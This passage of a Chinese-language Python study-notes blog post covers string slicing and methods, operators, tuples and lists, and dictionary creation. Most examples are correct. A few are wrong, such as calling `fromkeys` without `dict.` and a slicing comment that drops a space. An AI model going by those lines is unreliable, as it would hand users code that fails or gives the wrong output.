sample string&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">0</span>:-<span class="number">1</span>])  <span class="comment">#this will be &quot;this is a sample strin&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">0</span>])     <span class="comment">#this will be &quot;t&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">2</span>:])  <span class="comment">#this will be &quot;is a sample string&quot;</span></span><br></pre></td></tr></table></figure><h5 id="β-连续输出字符串中的某部分"><a href="#β-连续输出字符串中的某部分" class="headerlink" title="β. 连续输出字符串中的某部分"></a>β. 连续输出字符串中的某部分</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;this is a sample string&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">2</span>:<span class="number">5</span>] * <span class="number">2</span>)  <span class="comment">#this will be &quot;is is &quot;</span></span><br></pre></td></tr></table></figure><p>其中的索引还可以指定步长</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">2</span>:<span class="number">5</span>:<span class="number">2</span>])  <span class="comment">#this will be &quot;i&quot;</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Specially &gt; Python 字符串不能被改变。向一个索引位置赋值，比如str[0] = ‘m’会导致错误</span></p><h5 id="γ-判断子串包含关系"><a href="#γ-判断子串包含关系" class="headerlink" title="γ. 判断子串包含关系"></a>γ. 判断子串包含关系</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;asd&quot;</span> <span class="keyword">in</span> <span class="string">&quot;asdfg&quot;</span>) <span class="comment">#this will be True</span></span><br></pre></td></tr></table></figure><h5 id="θ-删除空白（字符串不改变）"><a href="#θ-删除空白（字符串不改变）" class="headerlink" title="θ. 删除空白（字符串不改变）"></a>θ. 删除空白<span style="color:brown">（字符串不改变）</span></h5><p><span style="font-family : Consolas">lstrip</span> : 从左开始删除参数中所给的每一个匹配字符直到第一个无法匹配的字符</p><p><span style="font-family : Consolas">rstrip</span> : 从右开始删除参数中所给的每一个匹配字符直到第一个无法匹配的字符</p><p><span style="font-family : Consolas">strip</span>：<span style="font-family : Consolas">lstrip</span> + <span style="font-family : Consolas">rstrip</span> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#escaping the &#x27; &#x27; in two ends when given no arguments</span></span><br><span class="line">a = <span class="string">&#x27;a aaacddd d&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#α escape all &#x27;a&#x27; &amp; &#x27;d&#x27; in two ends</span></span><br><span class="line"><span class="built_in">print</span>(a.strip(<span class="string">&#x27;ad&#x27;</span>))  <span class="comment">#this will be aaacddd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#β escape all &#x27;a&#x27; &amp; &#x27;d&#x27; &amp; &#x27; &#x27; in two ends</span></span><br><span class="line"><span class="built_in">print</span>(a.strip(<span class="string">&#x27;a d&#x27;</span>)) <span class="comment">#this will be c</span></span><br></pre></td></tr></table></figure><h5 id="σ-查找与替换（字符串不改变）"><a href="#σ-查找与替换（字符串不改变）" class="headerlink" title="σ. 查找与替换（字符串不改变）"></a>σ. 查找与替换<span style="color:brown">（字符串不改变）</span></h5><p>使用 <span style="font-family:Consolas">translate()</span> 来定义字符翻译映射表以实现一次替换所有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strg = <span class="string">&#x27;aaggbbggyyggacd&#x27;</span></span><br><span class="line">table = <span class="built_in">str</span>.maketrans(<span class="string">&#x27;aby&#x27;</span>,<span class="string">&#x27;αβγ&#x27;</span>)</span><br><span class="line">strg.translate(table) <span class="comment">#this will be &#x27;ααggββggγγggαcd&#x27;</span></span><br></pre></td></tr></table></figure><p>使用 <span style="font-family:Consolas">find()</span> 来寻找子串在字符串中第一次出现的位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strg = <span class="string">&#x27;aaggbbggyyggacd&#x27;</span></span><br><span class="line">strg.find(<span class="string">&#x27;a&#x27;</span>) <span class="comment">#this will be 0</span></span><br></pre></td></tr></table></figure><p>对于字符串是否以指定子串开头或结尾，使用 <span style="font-family:Consolas">startswith()</span>和 <span style="font-family:Consolas">endswith()</span> 来判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strg = <span class="string">&#x27;aaggbbggyyggacd&#x27;</span></span><br><span class="line">strg.endswith(<span class="string">&#x27;gg&#x27;</span>)   <span class="comment">#this will be False</span></span><br><span class="line">strg.startswith(<span class="string">&#x27;aa&#x27;</span>) <span class="comment">#this will be True</span></span><br></pre></td></tr></table></figure><h4 id="2-5-2-字符串的输出"><a href="#2-5-2-字符串的输出" class="headerlink" title="[2.5.2] 字符串的输出"></a>[2.5.2] 字符串的输出</h4><p>使用print搭配转换说明符输出时</p><p> <span style="font-family:Consolas">%r</span> 是使用 <span style="font-family:Consolas">repr()</span> 将变量或表达式转换为字符串</p><p> <span style="font-family:Consolas">%s</span> 是使用 <span style="font-family:Consolas">str()</span> 将变量或表达式转换为字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strg = <span class="string">&quot;asd&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%r %s&quot;</span> %(strg,strg)) <span class="comment">#also pay attention to the usage of print</span></span><br><span class="line"><span class="comment">#the result will be &#x27;asd&#x27; asd</span></span><br></pre></td></tr></table></figure><h4 id="2-6-2-算术运算符（specialized）"><a href="#2-6-2-算术运算符（specialized）" class="headerlink" title="[2.6.2] 算术运算符（specialized）"></a>[2.6.2] 算术运算符（specialized）</h4><h5 id="α-使用-来达到整除的效果"><a href="#α-使用-来达到整除的效果" class="headerlink" title="α. 使用 // 来达到整除的效果"></a>α. 使用 <span style="font-family:Consolas">//</span> 来达到整除的效果</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">32</span></span><br><span class="line"><span class="comment">#digits will be promoted when using simply &#x27;/&#x27; to do the division</span></span><br><span class="line">c / <span class="number">3</span>   <span class="comment">#the result will be 10.666666666666666</span></span><br><span class="line">c // <span class="number">3</span>  <span class="comment">#this will be 10</span></span><br></pre></td></tr></table></figure><h5 id="β-使用-来实现乘方运算"><a href="#β-使用-来实现乘方运算" class="headerlink" title="β. 使用 ** 来实现乘方运算"></a>β. 使用 ** 来实现乘方运算</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">2</span></span><br><span class="line">c **= <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(c) <span class="comment">#this will be 8</span></span><br></pre></td></tr></table></figure><h5 id="γ-is"><a href="#γ-is" class="headerlink" title="γ. is"></a>γ. is</h5><p><span style="font-family:Consolas">is</span> 只有在两个变量引用同一个对象时会返回 True，而 <span style="font-family:Consolas">==</span> 则是只要值相同即为True</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">3.14</span></span><br><span class="line">b = <span class="number">3.14</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#When id(a) != id(b)</span></span><br><span class="line">a <span class="keyword">is</span> b <span class="comment">#it will be False</span></span><br><span class="line">a == b <span class="comment">#it will be True</span></span><br></pre></td></tr></table></figure><h3 id="3-2-元组和列表"><a href="#3-2-元组和列表" class="headerlink" title="[3.2] 元组和列表"></a>[3.2] 元组和列表</h3><h5 id="pre-α-元组和列表的两个区别"><a href="#pre-α-元组和列表的两个区别" class="headerlink" title="pre.α. 元组和列表的两个区别"></a>pre.α. 元组和列表的两个区别</h5><p>列表的元素可以被重新赋值，但元组相当于常量，不能赋值</p><p>列表的两端使用方括号而元组的两端使用圆括号</p><h4 id="3-2-3-加法"><a href="#3-2-3-加法" class="headerlink" title="[3.2.3] 加法"></a>[3.2.3] 加法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tupleA = (<span class="number">1</span>,<span class="string">&#x27;lemon&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">tupleB = (<span class="number">2</span>,<span class="string">&#x27;lemon&#x27;</span>,<span class="number">3</span>)</span><br><span class="line">listB = [<span class="number">2</span>,<span class="string">&#x27;lemon&#x27;</span>,<span class="number">3</span>]</span><br><span class="line">listA = [<span class="number">1</span>,<span class="string">&#x27;lemon&#x27;</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(listA + listB)   <span class="comment">#this will be [1, &#x27;lemon&#x27;, 2, 2, &#x27;lemon&#x27;, 3]</span></span><br><span class="line"><span class="built_in">print</span>(tupleA + tupleB) <span class="comment">#this will be (1, &#x27;lemon&#x27;, 2, 2, &#x27;lemon&#x27;, 3)</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Specially &gt; 将列表与元组直接相加会导致 <span style="color:brown">TypeError: can only concatenate list (not “tuple”) to list</span> 的错误</span></p><h4 id="3-2-4-乘法"><a href="#3-2-4-乘法" class="headerlink" title="[3.2.4] 乘法"></a>[3.2.4] 乘法</h4><p>使用乘法可以将一个元素重复 <span style="font-family:Consolas">n</span> 次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(tupleA + tupleB * <span class="number">3</span>) </span><br><span class="line"><span class="comment">#this will be(1, &#x27;lemon&#x27;, 2, 2, &#x27;lemon&#x27;, 3, 2, &#x27;lemon&#x27;, 3, 2, &#x27;lemon&#x27;, 3)</span></span><br></pre></td></tr></table></figure><h4 id="3-2-5-in"><a href="#3-2-5-in" class="headerlink" title="[3.2.5] in"></a>[3.2.5] in</h4><p>用 <span style="font-family:Consolas">in</span> 来判断元素是否包括在元组或列表中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;lemon&#x27;</span> <span class="keyword">in</span> listA <span class="comment">#this will be true</span></span><br><span class="line"><span class="string">&#x27;lemon&#x27;</span> <span class="keyword">in</span> tupleA <span class="comment">#this will be true</span></span><br></pre></td></tr></table></figure><h4 id="3-2-6-长度、最大值与最小值"><a href="#3-2-6-长度、最大值与最小值" class="headerlink" title="[3.2.6]长度、最大值与最小值"></a>[3.2.6]长度、最大值与最小值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(tupleA)) <span class="comment">#this will be 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#When compare the English characters, ASCII will be check sequentially</span></span><br><span class="line">listWord = [<span class="string">&#x27;ab&#x27;</span>,<span class="string">&#x27;ac&#x27;</span>,<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">min</span>(listWord)) <span class="comment">#this will be ab</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(listWord)) <span class="comment">#this will be b</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Specially &gt; 直接比较类型不同的元素会引发 <span style="color:brown">TypeError: ‘&gt;’ not supported between instances of ‘str’ and ‘int’</span> 的错误</span></p><h4 id="3-2-7-序列的封包和解包"><a href="#3-2-7-序列的封包和解包" class="headerlink" title="[3.2.7]序列的封包和解包"></a>[3.2.7]序列的封包和解包</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tupleA = <span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>  <span class="comment">#this will automatically convert to a tuple</span></span><br><span class="line">a,b,c,d,e = tupleA       <span class="comment">#make the variables equals the elements in the tuple</span></span><br><span class="line"><span class="built_in">print</span>(a,b,c,d,e)  <span class="comment">#this will be 12 13 14 15 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Unpacking partially is also allowed</span></span><br><span class="line">tupleA = <span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span></span><br><span class="line">f,g,h,*rest = tupleA</span><br><span class="line"><span class="built_in">print</span>(f,g,h,rest) <span class="comment">#this will be 12 13 14 [15, 16]</span></span><br></pre></td></tr></table></figure><h4 id="3-α-列表的神奇操作"><a href="#3-α-列表的神奇操作" class="headerlink" title="[3.α] 列表的神奇操作"></a>[3.α] 列表的神奇操作</h4><h5 id="α-元组转换为列表（不可变到可变）"><a href="#α-元组转换为列表（不可变到可变）" class="headerlink" title="α. 元组转换为列表（不可变到可变）"></a>α. 元组转换为列表<span style="color:brown">（不可变到可变）</span></h5><p>使用 <span style="font-family:Consolas">list</span> 函数来将元组区间等转换成列表，但区间的步长起作用稍微有点神奇</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tuple_A = (<span class="string">&#x27;Luomos&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">list</span>(tuple_A) <span class="comment">#this will form a list</span></span><br><span class="line"></span><br><span class="line">rangeA = (<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(rangeA)) <span class="comment">#this will be [1,10]</span></span><br><span class="line"></span><br><span class="line">rangeB = (<span class="number">1</span>,<span class="number">10</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(rangeB)) <span class="comment">#this will be [1, 10, 3]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>,<span class="number">3</span>))) <span class="comment">#this will be [1, 4, 7]</span></span><br></pre></td></tr></table></figure><h5 id="β-向列表追加"><a href="#β-向列表追加" class="headerlink" title="β. 向列表追加"></a>β. 向列表追加</h5><p>调用列表的 <span style="font-family:Consolas">append</span> 方法可以向列表最后追加元素，但是<strong>无论追加什么，一次追加都只会形成一个嵌套元素</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">listA = [<span class="string">&#x27;Lumos&#x27;</span>]</span><br><span class="line">listA.append(<span class="string">&#x27;Lumos&#x27;</span>)</span><br><span class="line">tupleA = (<span class="string">&#x27;Lumos&#x27;</span>,<span class="string">&#x27;Maximum&#x27;</span>)</span><br><span class="line">listA.append(tupleA)</span><br><span class="line">listA.append(listA) <span class="comment">#it appends itself :)</span></span><br><span class="line"><span class="comment">#Above will eventually form [&#x27;Lumos&#x27;, &#x27;Lumos&#x27;, (&#x27;Lumos&#x27;, &#x27;Maximum&#x27;), [...]]</span></span><br></pre></td></tr></table></figure><p>如果想要一次追加多个元素而不被嵌套，使用 <span style="font-family:Consolas">extend</span> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">listA = [<span class="string">&#x27;Lumos&#x27;</span>]</span><br><span class="line">listA.extend(<span class="string">&#x27;Lumos&#x27;</span>)</span><br><span class="line">tupleA = (<span class="string">&#x27;Lumos&#x27;</span>,<span class="string">&#x27;Maximum&#x27;</span>)</span><br><span class="line">listA.extend(tupleA)</span><br><span class="line">listA.extend(listA) <span class="comment">#it extends itself :)</span></span><br><span class="line"><span class="comment">#Above will eventually form [&#x27;Lumos&#x27;, &#x27;L&#x27;, &#x27;u&#x27;, &#x27;m&#x27;, &#x27;o&#x27;, &#x27;s&#x27;, &#x27;Lumos&#x27;, &#x27;Maximum&#x27;, &#x27;Lumos&#x27;, &#x27;L&#x27;, &#x27;u&#x27;, &#x27;m&#x27;, &#x27;o&#x27;, &#x27;s&#x27;, &#x27;Lumos&#x27;, &#x27;Maximum&#x27;]</span></span><br></pre></td></tr></table></figure><p>但是同时也可以发现，<strong>单个追加元素时元素会被拆开</strong></p><h5 id="γ-删除列表元素"><a href="#γ-删除列表元素" class="headerlink" title="γ. 删除列表元素"></a>γ. 删除列表元素</h5><h6 id="ㄚ-删除列表中的元素切片（indexed）"><a href="#ㄚ-删除列表中的元素切片（indexed）" class="headerlink" title="ㄚ. 删除列表中的元素切片（indexed）"></a>ㄚ. 删除列表中的元素切片<span style="color:brown">（indexed）</span></h6><p> 使用 <span style="font-family:Consolas">del</span> 在删除列表中的元素时可以依照索引删除一个元素切片，其遵循所有一般切片的表示方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listA = [<span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> listA[<span class="number">1</span>:<span class="number">4</span>:<span class="number">2</span>] <span class="comment">#This will form [&#x27;Here&#x27;, &#x27;am&#x27;, &#x27;I&#x27;, &#x27;am&#x27;, &#x27;Here&#x27;, &#x27;I&#x27;, &#x27;am&#x27;]</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Specially &gt; 当没有切片属性而将列表名传递给 <span style="font-family:Consolas">del</span> 会使得整个列表变量被删除，再次调用该变量将引发 <span style="color:brown">NameError: name  is not defined </span>的错误</span></p><p>当需要清空一个列表时，最好使用 <span style="font-family:Consolas">clear</span> 方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listA = [<span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>]</span><br><span class="line">listA.clear() <span class="comment">#This will form []</span></span><br></pre></td></tr></table></figure><h6 id="ㄛ-删除指定元素的第一处"><a href="#ㄛ-删除指定元素的第一处" class="headerlink" title="ㄛ. 删除指定元素的第一处"></a>ㄛ. 删除指定元素的第一处</h6><p>使用 <span style="font-family:Consolas">remove</span> 方法可以删除指定元素的除此出现，而其后续其余元素顺次前移一个位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listA = [<span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>]</span><br><span class="line">listA.remove(<span class="string">&#x27;am&#x27;</span>) <span class="comment">#This will form [&#x27;Here&#x27;, &#x27;I&#x27;, &#x27;Here&#x27;, &#x27;I&#x27;, &#x27;am&#x27;, &#x27;Here&#x27;, &#x27;I&#x27;, &#x27;am&#x27;]</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Specially &gt; 当指定的元素不存在时，将引发 <span style="color:brown">ValueError: list.remove(x): x not in list </span>的错误</span></p><h5 id="θ-修改列表元素"><a href="#θ-修改列表元素" class="headerlink" title="θ. 修改列表元素"></a>θ. 修改列表元素</h5><p>列表的修改可以直接赋值，仍然遵循元素切片的一般表达方式，但是有两个特殊点</p><h6 id="ㄚ-指定步长时元素个数必须可预测"><a href="#ㄚ-指定步长时元素个数必须可预测" class="headerlink" title="ㄚ. 指定步长时元素个数必须可预测"></a>ㄚ. 指定步长时元素个数必须可预测</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listB = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line">listB[<span class="number">0</span>:<span class="number">8</span>:<span class="number">2</span>]=[<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>] <span class="comment">#This will form [5, 2, 5, 4, 5, 6, 5, 8, 9]</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Specially &gt; 元素个数不可预测时，将引发 <span style="color:brown">ValueError: attempt to assign sequence of size * to extended slice of size * </span>的错误</span></p><h6 id="ㄛ-使用字符串直接赋值时字符串会被拆解"><a href="#ㄛ-使用字符串直接赋值时字符串会被拆解" class="headerlink" title="ㄛ. 使用字符串直接赋值时字符串会被拆解"></a>ㄛ. 使用字符串直接赋值时字符串会被拆解</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listB = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line">listB[<span class="number">0</span>:<span class="number">2</span>]=<span class="string">&#x27;Hello&#x27;</span> <span class="comment">#This will form [&#x27;H&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, 3, 4, 5, 6, 7, 8, 9]</span></span><br></pre></td></tr></table></figure><p>字符串被拆解后，将从切片起点填充直到字符串结束，而切片终点无效</p><h5 id="δ-count-index-reverse-sort"><a href="#δ-count-index-reverse-sort" class="headerlink" title="δ. count/index/reverse/sort"></a>δ. count/index/reverse/sort</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">listB = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line">listB.index(<span class="number">2</span>) <span class="comment">#This will be 1</span></span><br><span class="line"></span><br><span class="line">listB.count(<span class="number">2</span>) <span class="comment">#This will be 1</span></span><br><span class="line"></span><br><span class="line">listB.reverse() <span class="comment">#This will form [9, 8, 7, 6, 5, 4, 3, 2, 1]</span></span><br><span class="line"></span><br><span class="line">listA = [<span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Here&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>]</span><br><span class="line">listA.sort(key=<span class="built_in">len</span>,reverse=<span class="literal">True</span>) <span class="comment">#key is the same as cmp in qsort in C</span></span><br><span class="line"><span class="comment">#This will form [&#x27;Here&#x27;, &#x27;Here&#x27;, &#x27;Here&#x27;, &#x27;am&#x27;, &#x27;am&#x27;, &#x27;I&#x27;, &#x27;I&#x27;, &#x27;I&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="3-4-字典"><a href="#3-4-字典" class="headerlink" title="[3.4] 字典"></a>[3.4] 字典</h3><h4 id="3-4-2-创建字典"><a href="#3-4-2-创建字典" class="headerlink" title="[3.4.2] 创建字典"></a>[3.4.2] 创建字典</h4><p>字典的创建有多种等价写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">dictA = <span class="built_in">dict</span>([(<span class="string">&#x27;A&#x27;</span>,<span class="number">1</span>),(<span class="string">&#x27;B&#x27;</span>,<span class="number">2</span>)])</span><br><span class="line">dictA = <span class="built_in">dict</span>([[<span class="string">&#x27;A&#x27;</span>,<span class="number">1</span>],[<span class="string">&#x27;B&#x27;</span>,<span class="number">2</span>]])</span><br><span class="line">dictA = <span class="built_in">dict</span>(A = <span class="number">1</span>,B = <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>除此之外，创建一个空字典也有多种写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dictB = <span class="built_in">dict</span>()</span><br><span class="line">dictB = &#123;&#125;</span><br></pre></td></tr></table></figure><p>元组作为一种不可变类型的，也是可以用作key的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dictC = &#123;(<span class="number">1</span>,<span class="number">2</span>):<span class="number">1</span>,<span class="number">2</span>:<span class="number">2</span>,<span class="number">3</span>:<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure><p>一次创建多key但value一定的字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dictD = fromkeys(&#123;<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>&#125;) <span class="comment">#dictD will be &#123;&#x27;A&#x27;:None,&#x27;B&#x27;:None&#125;</span></span><br><span class="line">dictD = fromkeys((<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>)) <span class="comment">#dictD will be &#123;&#x27;A&#x27;:None,&#x27;B&#x27;:None&#125;</span></span><br><span class="line"></span><br><span class="line">dictD = fromkeys((<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>),<span class="number">2</span>) <span class="comment">#dictD will be &#123;&#x27;A&#x27;:2,&#x27;B&#x27;:2&#125;</span></span><br></pre></td></tr></table></figure><h4 id="3-4-3-字典的基本操作"><a href="#3-4-3-字典的基本操作" class="headerlink" title="[3.4.3] 字典的基本操作"></a>[3.4.3] 字典的基本操作</h4><h5 id="α-删除字典元素"><a href="#α-删除字典元素" class="headerlink" title="α. 删除字典元素"></a>α. 删除字典元素</h5><p>使用 <span style="font-family:Consolas">del</span> 可以删除指定元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="keyword">del</span> dictA[<span class="string">&#x27;A&#x27;</span>]</span><br><span class="line"><span class="comment">#dictA will be &#123;&#x27;B&#x27;:2&#125; now</span></span><br></pre></td></tr></table></figure><p>使用 <span style="font-family:Consolas">clear</span> 可以清空一个字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dictA = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;B&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">dictA.clear()</span><br><span class="line"><span class="comment">#dictA will be &#123;&#125; now</span></span><br></pre></td></tr></table></figure><h5 id="β-获取字典元素"><a href="#β-获取字典元素" class="headerlink" title="β. 获取字典元素"></a>β. 获取字典元素</h5><p>使用 <span style="font-family:Consolas">get</span> 